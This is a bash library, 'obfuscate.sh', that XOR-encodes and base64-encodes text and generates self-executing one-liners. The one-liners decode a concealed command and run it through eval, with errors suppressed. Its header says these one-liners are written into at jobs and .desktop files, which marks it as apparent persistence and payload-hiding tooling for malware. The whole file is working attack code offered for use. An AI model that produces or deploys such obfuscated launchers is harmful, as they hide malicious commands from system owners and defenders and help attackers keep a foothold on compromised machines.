#!/usr/bin/env bash
#=============================================================================
# obfuscate.sh - XOR + base64 encode/decode library
#
# Usage:
#   source ./obfuscate.sh
#
# After sourcing, three functions are available:
#   ob_encode  "<plaintext>"   → prints the encoded blob (base64 string)
#   ob_decode  "<blob>"        → prints the decoded plaintext
#   ob_decoder "<plaintext>"   → prints a self-contained one-liner that,
#                                when run in any bash shell, decodes and
#                                executes the plaintext. This is what gets
#                                written into artifacts (at jobs, .desktop
#                                files, etc.)
# Configuration:
#   Set OB_KEY before sourcing, or export it before calling any function.
#   OB_KEY must be a single printable character.
#   Default: K
#=============================================================================

OB_KEY="${OB_KEY:-K}"  # Default key is 'K' if not set in environment

ob_encode() {
    local plaintext="$1"
    local key_byte=$(printf '%d' "'${OB_KEY}")
    local hex=""
    local i
    for (( i=0; i < ${#plaintext}; i++ )); do
        local char_byte=$(printf '%d' "'${plaintext:$i:1}")
        hex+=$(printf '%02x' "$(( char_byte ^ key_byte ))")
    done
    printf '%s' "$hex" | base64 | tr -d '\n'
}

ob_decode() {
    local blob="$1"
    local key_byte=$(printf '%d' "'${OB_KEY}")
    local hex=$(printf '%s' "$blob" | base64 -d)
    local result=""
    local i
    for (( i=0; i < ${#hex}; i+=2 )); do
        local byte_hex="${hex:$i:2}"
        local byte_dec=$(( 16#$byte_hex ))
        result+=$(printf '\\x%02x' $(( byte_dec ^ key_byte )) | xargs printf '%b')
    done
    printf '%s' "$result"
}

ob_decoder() {
    local plaintext="$1"
    local blob
    blob=$(ob_encode "$plaintext")
    local key_byte
    key_byte=$(printf '%d' "'${OB_KEY}")
    local key_byte_val="$key_byte"
    local blob_val="$blob"
    echo '_d(){ local h=$(echo "$1"|base64 -d 2>/dev/null);local r="";local i;for((i=0;i<${#h};i+=2));do local b=$((16#${h:i:2}));r+=$(printf "\\x$(printf '"'"'%02x'"'"' $((b ^ '"${key_byte_val}"')))");done;eval "$r" 2>/dev/null;}; _d '"'"''"${blob_val}"''"'"''
}